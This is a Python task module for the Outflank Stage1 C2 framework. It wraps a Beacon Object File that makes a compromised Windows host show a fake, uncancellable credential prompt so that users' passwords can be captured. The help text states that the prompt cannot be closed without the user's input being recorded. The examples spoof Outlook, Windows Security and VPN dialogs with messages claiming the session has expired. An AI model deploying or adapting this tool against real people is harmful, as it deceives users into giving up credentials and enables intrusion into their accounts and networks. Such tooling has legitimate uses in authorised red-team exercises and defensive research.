import os
from typing import List, Tuple

from outflank_stage1.implant.enums import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


_SCRIPT_BASE_PATH = os.path.dirname(os.path.abspath(__file__))


class CredPromptBOF(BaseBOFTask):
    def __init__(self):
        # x64-only: upstream ships an MSVC x64 .o; no x86 build is produced.
        super().__init__(
            "credprompt",
            base_binary_name="credprompt",
            supported_architectures=[ImplantArch.INTEL_X64],
        )
        self.set_base_path(_SCRIPT_BASE_PATH)

        self.parser.description = (
            "Start Windows credential prompt to capture user credentials. "
            "The prompt is persistent and will display for the specified timer duration."
        )

        self.parser.add_argument(
            "title",
            help="Custom window title for the credential prompt"
        )

        self.parser.add_argument(
            "message",
            help="Custom message displayed in the prompt window"
        )

        self.parser.add_argument(
            "timer",
            nargs="?",
            type=int,
            default=60,
            help="Number of seconds before the prompt auto-closes (default: 60)"
        )

        self.parser.epilog = (
            "The credential prompt is persistent, so the user cannot cancel/close it "
            "or enter an empty password without being recorded in the output.\n\n"
            "Example usage:\n"
            "  credprompt \"Microsoft Outlook\" \"Connecting to user@example.com\" 60\n"
            "  credprompt \"Windows Security\" \"Your session has expired. Please re-enter your credentials.\"\n"
            "  credprompt \"VPN Connection\" \"Authentication required\" 120"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)

        if not parser_arguments.title:
            raise TaskInvalidArgumentsException("Please provide a custom window title")

        if not parser_arguments.message:
            raise TaskInvalidArgumentsException("Please provide a custom message for the prompt")

        if parser_arguments.timer <= 0:
            raise TaskInvalidArgumentsException("Timer must be a positive number of seconds")

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        # BOF expects: ZZi (wide string title, wide string message, integer timer)
        return [
            (BOFArgumentEncoding.WSTR, parser_arguments.title),
            (BOFArgumentEncoding.WSTR, parser_arguments.message),
            (BOFArgumentEncoding.INT, parser_arguments.timer),
        ]
